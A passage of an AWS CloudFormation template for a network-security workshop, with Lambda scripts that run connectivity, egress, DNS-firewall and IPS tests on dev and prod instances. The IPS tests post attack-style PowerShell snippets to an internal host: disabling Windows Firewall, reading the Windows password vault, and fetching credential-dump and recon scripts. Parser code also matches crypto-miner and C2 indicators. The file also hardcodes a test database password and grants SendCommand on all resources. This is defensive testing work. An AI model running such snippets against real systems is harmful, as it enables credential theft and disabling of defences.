      RouteTableId: !Ref PublicInternetRouteTable

  PublicInternetSubnetRTAssociation:
    Type: AWS::EC2::SubnetRouteTableAssociation
    Properties:
      SubnetId: !Ref PublicInternetSubnet
      RouteTableId: !Ref PublicInternetRouteTable
# CloudFront Distribution Resources + Lambda Functions

# CloudFront Distro Resources

  # IAM Execution Role for Lambda used in the workshop
  LambdaExecutionRole:
    Metadata:
      cfn_nag:
        rules_to_suppress:
          - id: F3
            reason: "* is required in this use case."
          - id: W11
            reason: "* is required in this use case."
    Type: AWS::IAM::Role
    Properties:
      AssumeRolePolicyDocument:
        Version: "2012-10-17"
        Statement:
          - Action: sts:AssumeRole
            Effect: Allow
            Principal:
              Service: lambda.amazonaws.com
      ManagedPolicyArns:
        - arn:aws:iam::aws:policy/service-role/AWSLambdaBasicExecutionRole
      Policies:
        - PolicyName: SSMCommandAccess
          PolicyDocument:
            Version: '2012-10-17'
            Statement:
              - Effect: Allow
                Action:
                  - 'ssm:SendCommand'
                  - 'ssm:GetCommandInvocation'
                Resource: '*'

  # CloudFront Origin Access Control to allow CloudFront to invoke Lambda function
  CloudFrontLambdaOAC:
    Type: AWS::CloudFront::OriginAccessControl
    Properties:
      OriginAccessControlConfig:
        Name: CloudFrontLambdaOAC
        OriginAccessControlOriginType: lambda
        SigningBehavior: always
        SigningProtocol: sigv4

  TestScriptDistribution:
    Metadata:
      checkov:
        skip:
          - id: "CKV_AWS_174"
            comment: "Workshop CloudFront - TLS 1.2 is default, custom certificate not required"
          - id: "CKV_AWS_34"
            comment: "Workshop CloudFront - allow-all protocol policy required for test scripts"
          - id: "CKV_AWS_68"
            comment: "Workshop CloudFront - WAF not required for test script distribution"
          - id: "CKV_AWS_86"
            comment: "Workshop CloudFront - access logging not required"
          - id: "CLOUDFRONT_CUSTOM_SSL_CERTIFICATE"
            comment: "Workshop CloudFront - custom SSL certificate not required"
          - id: "CLOUDFRONT_DEFAULT_ROOT_OBJECT_CONFIGURED"
            comment: "Workshop CloudFront - serves Lambda functions, no default root object needed"
      cfn_nag:
        rules_to_suppress:
          - id: W10
            reason: "Workshop use case - access logging not required for test script invocations"
          - id: W70
            reason: "Workshop use case - TLS1.2 is already used by default"
    Type: AWS::CloudFront::Distribution
    Properties:
      DistributionConfig:
        CacheBehaviors:
          - TargetOriginId: DevToPRODTesterScript
            PathPattern: /dev-to-prod
            CachePolicyId: 4135ea2d-6df8-44a3-9df3-4b5a84be39ad # managed CachingDisabled
            ViewerProtocolPolicy: allow-all
          - TargetOriginId: EgressTesterScript
            PathPattern: /egress
            CachePolicyId: 4135ea2d-6df8-44a3-9df3-4b5a84be39ad # managed CachingDisabled
            ViewerProtocolPolicy: allow-all
          - TargetOriginId: AllowListTesterScript
            PathPattern: /allowlist
            CachePolicyId: 4135ea2d-6df8-44a3-9df3-4b5a84be39ad # managed CachingDisabled
            ViewerProtocolPolicy: allow-all
          - TargetOriginId: TLSInspectionTesterScript
            PathPattern: /tls-inspection
            CachePolicyId: 4135ea2d-6df8-44a3-9df3-4b5a84be39ad # managed CachingDisabled
            ViewerProtocolPolicy: allow-all
        DefaultCacheBehavior:
          TargetOriginId: DevToPRODTesterScript
          CachePolicyId: 4135ea2d-6df8-44a3-9df3-4b5a84be39ad # managed CachingDisabled
          ViewerProtocolPolicy: allow-all
        Comment: Building Secure Global Networks Tester Script
        Enabled: true
        HttpVersion: http2and3
        Origins:
          - Id: DevToPRODTesterScript
            DomainName: !Select [0, !Split [/, !Select [1, !Split [//, !GetAtt DevToPRODTesterScriptFunctionURL.FunctionUrl]]]]
            CustomOriginConfig:
              OriginProtocolPolicy: https-only
            OriginAccessControlId: !GetAtt CloudFrontLambdaOAC.Id
          - Id: EgressTesterScript
            DomainName: !Select [0, !Split [/, !Select [1, !Split [//, !GetAtt EgressTesterScriptFunctionURL.FunctionUrl]]]]
            CustomOriginConfig:
              OriginProtocolPolicy: https-only
            OriginAccessControlId: !GetAtt CloudFrontLambdaOAC.Id
          - Id: AllowListTesterScript
            DomainName: !Select [0, !Split [/, !Select [1, !Split [//, !GetAtt AllowListTesterScriptFunctionURL.FunctionUrl]]]]
            CustomOriginConfig:
              OriginProtocolPolicy: https-only
            OriginAccessControlId: !GetAtt CloudFrontLambdaOAC.Id
          - Id: TLSInspectionTesterScript
            DomainName: !Select [0, !Split [/, !Select [1, !Split [//, !GetAtt TLSInspectionTesterScriptFunctionURL.FunctionUrl]]]]
            CustomOriginConfig:
              OriginProtocolPolicy: https-only
            OriginAccessControlId: !GetAtt CloudFrontLambdaOAC.Id

  DevToPRODTesterScriptLogGroup:
    Metadata:
      checkov:
        skip:
          - id: "CKV_AWS_158"
            comment: "Ensure that CloudWatch Log Group is encrypted by KMS"
      cfn_nag:
        rules_to_suppress:
          - id: W84
            reason: "CloudWatch Log Group does not require KMS encryption"
    Type: AWS::Logs::LogGroup
    Properties:
      LogGroupName: "/aws/lambda/dev-to-prod-lambda"
      RetentionInDays: 7
  # Manual Scanner Lambda Function
  DevToPRODTesterScript:
    Metadata:
      checkov:
        skip:
          - id: "CKV_AWS_117"
            comment: "Ensure that AWS Lambda function is configured inside a VPC"
          - id: "CKV_AWS_116"
            comment: "Ensure that AWS Lambda function is configured for a Dead Letter Queue(DLQ)"
          - id: "CKV_AWS_115"
            comment: "Ensure that AWS Lambda function is configured for function-level concurrent execution limit"
          - id: "CKV_AWS_173"
            comment: "Check encryption settings for Lambda environment variable"
      cfn_nag:
        rules_to_suppress:
          - id: W89
            reason: "Lambda function does not need to be deployed in a VPC"
          - id: W92
            reason: "Lambda function does not need ReservedConcurrentExecutions"
    Type: AWS::Lambda::Function
    Properties:
      Code:
        ZipFile: |
          from os import environ
          import concurrent.futures
          import boto3
          import time
          from datetime import datetime
          import io
          import sys

          debug_mode = False

          def log_message(message):
              if debug_mode:
                  print(f"[DEBUG][{datetime.now().strftime('%H:%M:%S.%f')}] {message}")

          def execute_tests_in_parallel(tests, ssm_client, test_type):
              with concurrent.futures.ThreadPoolExecutor(max_workers=3) as executor:
                  futures = [
                      executor.submit(
                          execute_ssm_command,
                          ssm_client,
                          test['InstanceId'],
                          test['Command']
                      ) for test in tests
                  ]
                  return [future.result() for future in futures]

          def print_test_result(test, result_string, ret_code):
              test_name = test['Name']
              env_vars = {
                  'sanitized_db_ip': environ['SANITIZED_DB_IP'],
                  'prod_db_ip': environ['PROD_DB_IP'],
                  'prod_web_server': environ['PROD_WEB_SERVER_IP']
              }
              
              sanitized_command = sanitize_command(test['Command'], env_vars)
              request_line = f"Request: {sanitized_command}"
              
              if ret_code == 1 and 'Baseline' in test['Type']:
                  return f'<span class="success">Test Name: {test_name}<span style="display:inline-block; width:50px;"></span>Result: {result_string}</span>\n{request_line}\n<hr>'
              elif ret_code == 0 and 'Baseline' in test['Type']:
                  return f'<span class="fail">Test Name: {test_name}<span style="display:inline-block; width:50px;"></span>Result: {result_string}</span>\n{request_line}\n<hr>'
              elif ret_code == 1 and 'Baseline' not in test['Type']:
                  return f'<span class="fail">Test Name: {test_name}<span style="display:inline-block; width:50px;"></span>Result: {result_string}</span>\n{request_line}\n<hr>'
              elif ret_code == 0 and 'Baseline' not in test['Type']:
                  return f'<span class="success">Test Name: {test_name}<span style="display:inline-block; width:50px;"></span>Result: {result_string}</span>\n{request_line}\n<hr>'
              else:
                  return f'<span class="warning">Test Name: {test_name}<span style="display:inline-block; width:50px;"></span>Result: {result_string}</span>\n{request_line}\n<hr>'

          def execute_ssm_command(ssm_client, instance_id, command):
              try:
                  response = ssm_client.send_command(
                      InstanceIds=[instance_id],
                      DocumentName='AWS-RunShellScript',
                      Parameters={'commands': [command]}
                  )
                  command_id = response['Command']['CommandId']
                  log_message(f"SSM Command ID: {command_id}")

                  max_attempts = 5
                  attempt = 0
                  while attempt < max_attempts:
                      try:
                          output = ssm_client.get_command_invocation(
                              CommandId=command_id,
                              InstanceId=instance_id
                          )
                          
                          if output['Status'] in ['Success', 'Failed', 'Cancelled']:
                              log_message(f"Command completed with status: {output['Status']}")
                              return output['Status'], output.get('StandardOutputContent', ''), output.get('StandardErrorContent', '')
                          
                          time.sleep(1)
                          attempt += 1
                      except ssm_client.exceptions.InvocationDoesNotExist:
                          time.sleep(1)
                          attempt += 1
                          continue

                  return 'Timeout', '', 'Command execution timed out'
              except Exception as e:
                  return 'Failed', '', str(e)

          def parse_result(status, stdout, stderr, command):
              log_message(f"Command status: {status}")
              log_message(f"stdout: '{stdout}'")
              log_message(f"stderr: '{stderr}'")

              # For MySQL connections - check the command itself
              if 'mysql' in command:
                  log_message("MySQL connection detected")
                  # If status is Timeout or Failed, it's blocked
                  if status in ['Timeout', 'Failed']:
                      log_message("Command timed out or failed - blocking connection")
                      return ('Connection Blocked', 0)
                  # Success with '1' means it worked
                  if '1' in stdout:
                      log_message("Found '1' in stdout - allowing connection")
                      return ('Connection Allowed', 1)
                  # If no '1' in output, it's blocked
                  log_message("No '1' in stdout - blocking connection")
                  return ('Connection Blocked', 0)
              
              # For curl connections
              if 'curl' in stdout or stderr:
                  if 'Connection timed out' in stderr or 'Failed to connect' in stderr:
                      return ('Connection Blocked', 0)
                  if '(7)' in stderr or '(28)' in stderr:
                      return ('Connection Blocked', 0)
                  return ('Connection Allowed', 1)
              
              # Default case
              if stdout.strip():
                  return ('Connection Allowed', 1)
              return ('Connection Blocked', 0)

          def parse_ips_filter_result(status, stdout, stderr):
              log_message(f"IPS Filter Test - Status: {status}")
              log_message(f"IPS Filter Test - Stdout: {stdout}")
              log_message(f"IPS Filter Test - Stderr: {stderr}")

              # Check for specific IPS block indicators
              block_indicators = [
                  'Connection refused',
                  'Connection timed out',
                  'Failed to connect',
                  '403 Forbidden',
                  'exit status 28',  # curl timeout
                  'exit status 3',   # curl error
                  'reset by peer'
              ]

              if status != 'Success':
                  return ('Connection Blocked', 0)

              if any(indicator in stderr for indicator in block_indicators):
                  return ('Connection Blocked', 0)

              # If we get a 404, the request got through
              if 'Not Found' in stdout:
                  return ('Connection Allowed', 1)

              # If we get any response, check if it indicates blocking
              if stdout.strip():
                  if any(indicator in stdout for indicator in ['Access Denied', 'Forbidden']):
                      return ('Connection Blocked', 0)
                  return ('Connection Allowed', 1)

              # Default to blocked if we're unsure
              return ('Connection Blocked', 0)

          def sanitize_command(command, env_vars):
              sanitized = command
              replacements = {
                  env_vars['sanitized_db_ip']: '$SANITIZED_PROD_DB',
                  env_vars['prod_db_ip']: '$PROD_DB',
                  env_vars['prod_web_server']: '$INTERNAL_API'
              }
              
              for ip, friendly_name in replacements.items():
                  sanitized = sanitized.replace(ip, friendly_name)
              
              # Convert multiline command to single line for display while preserving spaces
              sanitized = sanitized.replace('\\\n', ' ').replace('                ', ' ')
              
              return sanitized

          def handler(event, context):
              buffer = io.StringIO()
              sys.stdout = buffer

              ssm_client = boto3.client('ssm')

              dev_instance_id = environ['DEV_INSTANCE_ID']
              prod_web_server = environ['PROD_WEB_SERVER_IP']
              sanitized_db_ip = environ['SANITIZED_DB_IP']
              prod_db_ip = environ['PROD_DB_IP']

              baseline_tests = [
                  {
                      'Name': 'DEV resource connecting to sanitized PROD database',
                      'Type': 'Baseline',
                      'InstanceId': dev_instance_id,
                      'Command': f"mysql -N --connect-timeout=1 --wait -h {sanitized_db_ip} -u testuser -p'TestPassword@1234' -e 'SELECT 1;'"
                  },
                  {
                      'Name': 'DEV resource connecting to to PROD internal API',
                      'Type': 'Baseline',
                      'InstanceId': dev_instance_id,
                      'Command': f'curl -s --connect-timeout 1 --max-time 2 http://{prod_web_server}'
                  }
              ]
              
              least_privilege_tests = [
                  {
                      'Name': 'DEV resource connecting to main PROD database',
                      'Type': 'LeastPrivilege',
                      'InstanceId': dev_instance_id,
                      'Command': f"mysql -N --connect-timeout=1 --wait -h {prod_db_ip} -u testuser -p'TestPassword@1234' -e 'SELECT 1;'"
                  }
              ]

              ips_filtering_tests = [
                  # Core Security Control Tests
                  {
                      'Name': 'Querying Installed AntiVirus',
                      'Type': 'IPSFilter',
                      'InstanceId': dev_instance_id,
                      'Command': f"curl -s -k --connect-timeout 1 --max-time 2 -H 'Content-Type: text/plain' -d 'Get-CimInstance -ClassName \"AntiVirusProduct\"' 'http://{prod_web_server}/script.ps1'"
                  },
                  {
                      'Name': 'Disable Windows Firewall Snippet',
                      'Type': 'IPSFilter',
                      'InstanceId': dev_instance_id,
                      'Command': f"curl -s -k --connect-timeout 1 --max-time 2 -H 'Content-Type: text/plain' -d 'Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False' 'http://{prod_web_server}/script.ps1'"
                  },
                  {
                      'Name': 'Byte Array Obfuscation',
                      'Type': 'IPSFilter',
                      'InstanceId': dev_instance_id,
                      'Command': f"curl -s -k --connect-timeout 1 --max-time 2 -H 'Content-Type: text/plain' -d '[Byte[]]$var = 0x48,0x65,0x6c,0x6c,0x6f=(1)' 'http://{prod_web_server}/script.ps1'"
                  },
                  {
                      'Name': 'Get-ClearTextPasswords',
                      'Type': 'IPSFilter',
                      'InstanceId': dev_instance_id,
                      'Command': f"curl -s -k --connect-timeout 1 --max-time 2 -H 'Content-Type: text/plain' -d '[Windows.Security.Credentials.PasswordVault].GetMethod(\"RetrievePassword\").Invoke()' 'http://{prod_web_server}/script.ps1'"
                  },
                  
                  # Environmental Reconnaissance Tests
                  {
                      'Name': 'Domain Controller Credential Dump Script',
                      'Type': 'IPSFilter',
                      'InstanceId': dev_instance_id,
                      'Command': f"curl -s -k --connect-timeout 1 --max-time 2 -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)' -H 'Accept: application/x-powershell' 'http://{prod_web_server}/secrets.ps1'"
                  },
                  {
                      'Name': 'Environment Reconnaissance Script',
                      'Type': 'IPSFilter',
                      'InstanceId': dev_instance_id,
                      'Command': f"curl -s -k --connect-timeout 1 --max-time 2 -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)' -H 'Accept: application/x-powershell' 'http://{prod_web_server}/kirby.ps1'"
                  }
              ]


              print('<h2>DEV to PROD Tests</h2>')
              print('<hr>')

              print('<h3>Baseline Traffic Test</h3>')
              baseline_results = execute_tests_in_parallel(baseline_tests, ssm_client, 'baseline')
              for test, result in zip(baseline_tests, baseline_results):
                  status, stdout, stderr = result
                  result_string, ret_code = parse_result(status, stdout, stderr, test['Command'])
                  output_line = print_test_result(test, result_string, ret_code)
                  print(output_line)

              print('<h3>Least Privilege Network Access Test</h3>')
              least_privilege_results = execute_tests_in_parallel(least_privilege_tests, ssm_client, 'least_privilege')
              for test, result in zip(least_privilege_tests, least_privilege_results):
                  status, stdout, stderr = result
                  result_string, ret_code = parse_result(status, stdout, stderr, test['Command'])
                  output_line = print_test_result(test, result_string, ret_code)
                  print(output_line)

              print('<h3>Intrusion Detection + Prevention (IDS/IPS) Filtering</h3>')
              ips_filtering_results = execute_tests_in_parallel(ips_filtering_tests, ssm_client, 'ips_filtering')
              for test, result in zip(ips_filtering_tests, ips_filtering_results):
                  status, stdout, stderr = result
                  result_string, ret_code = parse_ips_filter_result(status, stdout, stderr)
                  output_line = print_test_result(test, result_string, ret_code)
                  print(output_line)

              output = buffer.getvalue()
              sys.stdout = sys.__stdout__

              css_styles = """
              <style>
                  .success { color: green; }
                  .fail { color: red; }
                  .warning { color: orange; }
                  hr { border: 1px solid black; }
                  pre { white-space: pre-wrap; word-wrap: break-word; }
                  h3 { margin-top: 20px; margin-bottom: 10px; }
              </style>
              """

              body = css_styles + '<pre>' + output + '</pre>'
              
              return {
                  'statusCode': 200,
                  'body': body,
                  'headers': {
                      'Content-Type': 'text/html'
                  }
              }
      FunctionName: DEV-To-PROD
      Handler: index.handler
      Role: !GetAtt LambdaExecutionRole.Arn
      Runtime: python3.12
      MemorySize: 4096
      Timeout: 60
      LoggingConfig:
        LogGroup: !Ref DevToPRODTesterScriptLogGroup
      Environment:
        Variables:
          DEV_INSTANCE_ID: !GetAtt DevVPC1WorkloadInstance1.InstanceId
          PROD_INSTANCE_ID: !GetAtt ProdVPC1WorkloadInstance1.InstanceId
          PROD_WEB_SERVER_IP: !GetAtt ProdVPC1WorkloadInstance1.PrivateIp
          SANITIZED_DB_IP: !GetAtt ProdVPC1WorkloadInstance3.PrivateIp
          PROD_DB_IP: !GetAtt ProdVPC1WorkloadInstance2.PrivateIp
          PUBLIC_INTERNET_HOST_IP: !GetAtt PublicInternetHost.PublicIp 

  # Lambda function URL for manual scanner function
  DevToPRODTesterScriptFunctionURL:
    Type: AWS::Lambda::Url
    Properties:
      AuthType: AWS_IAM
      TargetFunctionArn: !GetAtt DevToPRODTesterScript.Arn

  # Allow Manual Scanner Lambda to be invoked from CloudFront via OAC
  DevToPRODTesterScriptPermissionPolicy:
    Metadata:
      cfn_nag:
        rules_to_suppress:
          - id: W24
            reason: "Policy is required"
    Type: AWS::Lambda::Permission
    Properties:
      Action: lambda:InvokeFunctionUrl
      FunctionName: !Ref DevToPRODTesterScript
      Principal: cloudfront.amazonaws.com
      SourceArn: !Sub arn:${AWS::Partition}:cloudfront::${AWS::AccountId}:distribution/${TestScriptDistribution}
  EgressTesterScriptLogGroup:
    Metadata:
      checkov:
        skip:
          - id: "CKV_AWS_158"
            comment: "Ensure that CloudWatch Log Group is encrypted by KMS"
      cfn_nag:
        rules_to_suppress:
          - id: W84
            reason: "CloudWatch Log Group does not require KMS encryption"
    Type: AWS::Logs::LogGroup
    Properties:
      LogGroupName: "/aws/lambda/egress-test-lambda-logs"
      RetentionInDays: 7

  # Manual Scanner Lambda Function
  EgressTesterScript:
    Metadata:
      checkov:
        skip:
          - id: "CKV_AWS_117"
            comment: "Ensure that AWS Lambda function is configured inside a VPC"
          - id: "CKV_AWS_116"
            comment: "Ensure that AWS Lambda function is configured for a Dead Letter Queue(DLQ)"
          - id: "CKV_AWS_115"
            comment: "Ensure that AWS Lambda function is configured for function-level concurrent execution limit"
          - id: "CKV_AWS_173"
            comment: "Check encryption settings for Lambda environment variable"
      cfn_nag:
        rules_to_suppress:
          - id: W89
            reason: "Lambda function does not need to be deployed in a VPC"
          - id: W92
            reason: "Lambda function does not need ReservedConcurrentExecutions"
    Type: AWS::Lambda::Function
    Properties:
      Code:
        ZipFile: |
          from os import environ
          import concurrent.futures
          import boto3
          import time
          from datetime import datetime
          import io
          import sys

          debug_mode = False

          def log_message(message):
              if debug_mode:
                  print(f"[DEBUG][{datetime.now().strftime('%H:%M:%S')}] {message}")

          def execute_tests_in_parallel(tests, ssm_client, test_type):
              with concurrent.futures.ThreadPoolExecutor(max_workers=3) as executor:
                  futures = [
                      executor.submit(
                          execute_ssm_command if test_type != 'egress' else execute_egress_test,
                          ssm_client,
                          test['InstanceId'],
                          test['Command']
                      ) for test in tests
                  ]
                  return [future.result() for future in futures]

          def execute_ssm_command(ssm_client, instance_id, command):
              try:
                  response = ssm_client.send_command(
                      InstanceIds=[instance_id],
                      DocumentName='AWS-RunShellScript',
                      Parameters={'commands': [command]}
                  )
                  command_id = response['Command']['CommandId']

                  max_attempts = 5
                  attempt = 0
                  while attempt < max_attempts:
                      try:
                          output = ssm_client.get_command_invocation(
                              CommandId=command_id,
                              InstanceId=instance_id
                          )
                          
                          if output['Status'] in ['Success', 'Failed', 'Cancelled']:
                              return output['Status'], output.get('StandardOutputContent', ''), output.get('StandardErrorContent', '')
                          
                          time.sleep(1)
                          attempt += 1
                      except ssm_client.exceptions.InvocationDoesNotExist:
                          time.sleep(1)
                          attempt += 1
                          continue

                  return 'Timeout', '', 'Command execution timed out'
              except Exception as e:
                  log_message(f"ERROR: {str(e)}")
                  return 'Failed', '', str(e)
              
          def execute_all_tests_in_parallel(tests, ssm_client, test_type, dev_instance_id, prod_instance_id):
              with concurrent.futures.ThreadPoolExecutor(max_workers=6) as executor:  # Increased for true parallelism
                  futures = []
                  for test in tests:
                      # Submit DEV test
                      dev_test = test.copy()
                      dev_test['InstanceId'] = dev_instance_id
                      futures.append((test['Name'], 'DEV', executor.submit(
                          execute_ssm_command if test_type != 'egress' else execute_egress_test,
                          ssm_client,
                          dev_instance_id,
                          test['Command']
                      )))
                      
                      # Submit PROD test
                      prod_test = test.copy()
                      prod_test['InstanceId'] = prod_instance_id
                      futures.append((test['Name'], 'PROD', executor.submit(
                          execute_ssm_command if test_type != 'egress' else execute_egress_test,
                          ssm_client,
                          prod_instance_id,
                          test['Command']
                      )))
                  
                  # Create a dict to store results
                  results = {}
                  for name, env, future in futures:
                      try:
                          result = future.result()
                          if name not in results:
                              results[name] = {'DEV': None, 'PROD': None}
                          results[name][env] = result
                      except Exception as e:
                          log_message(f"ERROR in {name} - {env}: {str(e)}")
                          
                  return results

          def parse_result(status, stdout, stderr, test_type):
              log_message(f"=== Test Details ===")
              log_message(f"Test type: {test_type}")
              log_message(f"Status: {status}")
              log_message(f"stdout: {stdout}")
              log_message(f"stderr: {stderr}")

              # For IPS filtering tests
              if test_type == 'IPSFilter':
                  # Common block indicators
                  block_indicators = [
                      'Operation timed out',
                      'Connection refused',
                      'Failed to connect',
                      '403 Forbidden',
                      'Unable to connect',
                      'reset by peer',
                      'Empty reply from server'
                  ]

                  # Check if the connection was blocked
                  connection_blocked = (
                      status == 'Timeout' or
                      any(indicator in stdout or indicator in stderr for indicator in block_indicators)
                  )

                  # Special handling for binary download test with MultiMiner user agent
                  if 'MultiMiner/V' in stdout:
                      log_message("Processing MultiMiner user agent test...")
                      if 'Operation timed out' in stdout or connection_blocked:
                          log_message("IPS Filter: MultiMiner request blocked")
                          return ('Connection Blocked', 1)
                      log_message("IPS Filter: MultiMiner request allowed")
                      return ('Connection Allowed', 0)
                      
                  elif '/cpu64.exe' in stdout:
                      log_message("Processing binary download test...")
                      if 'Operation timed out' in stdout or connection_blocked:
                          log_message("IPS Filter: Binary download blocked")
                          return ('Connection Blocked', 1)
                      log_message("IPS Filter: Binary download allowed")
                      return ('Connection Allowed', 0)
                      
                  elif '/pool.config' in stdout or 'XMRig' in stdout:
                      log_message("Processing mining pool config test...")
                      if connection_blocked or 'denied' in stdout.lower():
                          log_message("IPS Filter: Mining pool config blocked")
                          return ('Connection Blocked', 1)
                      elif 'pool.monero.hashvault.pro' in stdout:
                          log_message("IPS Filter: Mining pool config allowed")
                          return ('Connection Allowed', 0)
                      log_message("IPS Filter: Mining pool config blocked (no valid response)")
                      return ('Connection Blocked', 1)
                  
                  elif '/pool' in stdout:
                      log_message("Processing C2 communication test...")
                      if connection_blocked:
                          log_message("IPS Filter: C2 communication blocked")
                          return ('Connection Blocked', 1)
                      elif 'HTTP/1.1 301' in stdout or 'HTTP/1.1 200' in stdout:
                          log_message("IPS Filter: C2 communication allowed")
                          return ('Connection Allowed', 0)
                      log_message("IPS Filter: C2 communication blocked (no valid response)")
                      return ('Connection Blocked', 1)

              # For baseline tests
              elif test_type == 'Baseline':
                  if stdout.strip() or 'HTTP/1.1 200 OK' in stderr:
                      log_message("Baseline: Connection allowed")
                      return ('Connection Allowed', 1)
                  log_message("Baseline: Connection blocked")
                  return ('Connection Blocked', 0)

              # For egress tests
              elif test_type == 'Egress':
                  if stdout.strip() == 'BLOCKED':
                      log_message("Egress: Connection blocked")
                      return ('Blocked', 0)
                  elif stdout.strip() == 'ALLOWED':
                      log_message("Egress: Connection allowed")
                      return ('Allowed', 1)
                  
                  # Check for DNS firewall block responses
                  if 'dns-firewall-block' in stdout:
                      log_message("Egress: DNS firewall blocked domains")
                      return ('Blocked', 0)
                  
                  # Check for TLD test output first (before checking for 'dig' keyword)
                  if 'Resolved' in stdout and '/10 domains:' in stdout:
                      # Parse the wrapper output format: "Resolved X/10 domains: ..."
                      import re
                      match = re.search(r'Resolved (\d+)/(\d+) domains:', stdout)
                      if match:
                          resolved_count = int(match.group(1))
                          total_domains = int(match.group(2))
                          
                          log_message(f"Egress: Abused TLD test - {resolved_count}/{total_domains} domains resolved")
                          
                          if resolved_count < 1:
                              log_message("Egress: Abused TLD domains blocked")
                              return ('Blocked', 0)
                          elif resolved_count < 4:
                              log_message("Egress: Abused TLD domains partially allowed (low)")
                              return ('Partially Allowed', 1)
                          elif resolved_count < 8:
                              log_message("Egress: Abused TLD domains partially allowed (medium)")
                              return ('Partially Allowed', 1)
                          else:
                              log_message("Egress: Abused TLD domains allowed (high)")
                              return ('Allowed', 1)
                      else:
                          log_message("Egress: Could not parse TLD test results")
                          return ('Unknown', 0)
                  
                  # If the output doesn't contain BLOCKED or ALLOWED, we'll do additional checks
                  if 'dig' in stdout or stderr:
                      if 'controldomain1.aggregatelist.firewall.route53resolver.us-east-1.amazonaws.com' in stdout:
                          if '1.2.3.4' in stdout:
                              log_message("Egress: AWS Threat List DNS query allowed")
                              return ('Allowed', 1)
                          else:
                              log_message("Egress: AWS Threat List DNS query blocked")
                              return ('Blocked', 0)
                      # Handle other dig commands
                      elif 'NXDOMAIN' in stdout or 'connection timed out' in stdout or 'no servers could be reached' in stdout:
                          log_message("Egress: DNS query blocked")
                          return ('Blocked', 0)
                      elif ';; ANSWER SECTION:' in stdout:
                          log_message("Egress: DNS query allowed")
                          return ('Allowed', 1)
                      else:
                          log_message("Egress: DNS query result unclear")
                          return ('Unknown', 0)
                  
                  if 'ping' in stdout:
                      if '0 received' in stdout or 'Destination Host Unreachable' in stdout:
                          log_message("Egress: Ping blocked")
                          return ('Blocked', 0)
                      log_message("Egress: Ping allowed")
                      return ('Allowed', 1)

              # Default case
              if status != 'Success':
                  log_message("Default: Connection blocked (status not Success)")
                  return ('Connection Blocked', 0)
              log_message("Default: Connection allowed")
              return ('Connection Allowed', 1)


          def print_test_result(test, dev_result, prod_result):
              test_name = test['Name']
              env_vars = {
                  'PUBLIC_INTERNET_HOST_IP': environ['PUBLIC_INTERNET_HOST_IP']
              }
              
              sanitized_command = sanitize_command(test['Command'], env_vars)
              request_line = f"Request: {sanitized_command}"
              
              log_message(f"Dev Result: {dev_result}")
              log_message(f"Prod Result: {prod_result}")
              
              # Handle different test types
              if 'Baseline' in test['Type']:
                  # For Baseline tests: 1 = success (green), 0 = failure (red)
                  dev_result_str = f'<span class="success">Connection Allowed from DEV</span>' if dev_result[1] == 1 else f'<span class="fail">Connection Blocked from DEV</span>'
                  prod_result_str = f'<span class="success">Connection Allowed from PROD</span>' if prod_result[1] == 1 else f'<span class="fail">Connection Blocked from PROD</span>'
                  line_color = "success" if dev_result[1] == 1 or prod_result[1] == 1 else "fail"
              
              elif test['Type'] == 'IPSFilter':
                  # For IPS tests: 0 = allowed (red), 1 = blocked (green)
                  dev_result_str = f'<span class="fail">Connection Allowed from DEV</span>' if dev_result[1] == 0 else f'<span class="success">Connection Blocked from DEV</span>'
                  prod_result_str = f'<span class="fail">Connection Allowed from PROD</span>' if prod_result[1] == 0 else f'<span class="success">Connection Blocked from PROD</span>'
                  line_color = "success" if (dev_result[1] == 1 and prod_result[1] == 1) else "fail"
              
              elif test['Type'] == 'Egress':
                  # For Egress tests: 1 = allowed (red), 0 = blocked (green)
                  dev_result_str = f'<span class="fail">Connection Allowed from DEV</span>' if dev_result[1] == 1 else f'<span class="success">Connection Blocked from DEV</span>'
                  prod_result_str = f'<span class="fail">Connection Allowed from PROD</span>' if prod_result[1] == 1 else f'<span class="success">Connection Blocked from PROD</span>'
                  line_color = "success" if (dev_result[1] == 0 and prod_result[1] == 0) else "fail"
              
              # Format the full line with proper spacing and consistent coloring
              return f'<span class="{line_color}">{test_name}<span style="display:inline-block; width:50px;"></span>Result:</span> {dev_result_str} | {prod_result_str}\n{request_line}\n<hr>'


          def sanitize_command(command, env_vars):
              sanitized = command
              for key, value in env_vars.items():
                  if key == 'PUBLIC_INTERNET_HOST_IP':
                      sanitized = sanitized.replace(value, '$PUBLIC_INTERNET_HOST')
                  else:
                      sanitized = sanitized.replace(value, key)
              
              # Sanitize GeoIP test domains
              if "sld.cu" in sanitized:
                  sanitized = "curl $ITAR_RESTRICTED_COUNTRY_DOMAIN"
              elif "fnac.com" in sanitized:
                  sanitized = "curl $NON_US_OR_CANADA_DOMAIN"
              elif "oast.fun" in sanitized:
                  sanitized = "curl --resolve $THREAT_INTEL_DOMAIN:443:1.1.1.2 https://$THREAT_INTEL_DOMAIN/"
              
              return sanitized

          def get_wrapper_for_test(command):
              """Wrapper for egress test commands"""
              if command.startswith("dig"):
                  if "aggregatelist.firewall.route53resolver" in command:
                      return f"""
                          RESULT=$(timeout 3 {command})
                          if [[ $RESULT == *"1.2.3.4"* ]]; then
                              echo "ALLOWED"
                          else
                              echo "BLOCKED"
                          fi
                      """
                  else:
                      return f"""
                          RESULT=$(timeout 3 {command})
                          if [[ $? -eq 124 ]] || [[ $RESULT == *"connection timed out"* ]] || [[ $RESULT == *"no servers could be reached"* ]]; then
                              echo "BLOCKED"
                          else
                              echo "ALLOWED"
                          fi
                      """
              elif command.startswith("for domain in"):
                  # Handle the Abused TLD test specifically
                  return f"""
                      TOTAL=0
                      SUCCESS=0
                      RESULTS=""
                      for domain in google.ru google.cn eth.xyz a.nic.cyou ns1.nic.pw a.dns.ws a.ns.gq a.nic.surf a.ns.cf a.nic.ml; do
                          let TOTAL++
                          # Use dig without +short to check for SERVFAIL
                          RESULT=$(timeout 3 dig +timeout=1 $domain 2>&1)
                          # Check if the query succeeded (not SERVFAIL, NXDOMAIN, or timeout)
                          if [[ $RESULT == *"status: NOERROR"* ]] && [[ $RESULT != *"ANSWER: 0"* ]]; then
                              let SUCCESS++
                              # Extract IP for display
                              IP=$(echo "$RESULT" | grep -A1 "ANSWER SECTION" | tail -1 | awk '{{print $NF}}')
                              RESULTS="$RESULTS$IP "
                          elif [[ $RESULT == *"status: SERVFAIL"* ]]; then
                              RESULTS="${{RESULTS}}SERVFAIL "
                          else
                              RESULTS="${{RESULTS}}BLOCKED "
                          fi
                      done
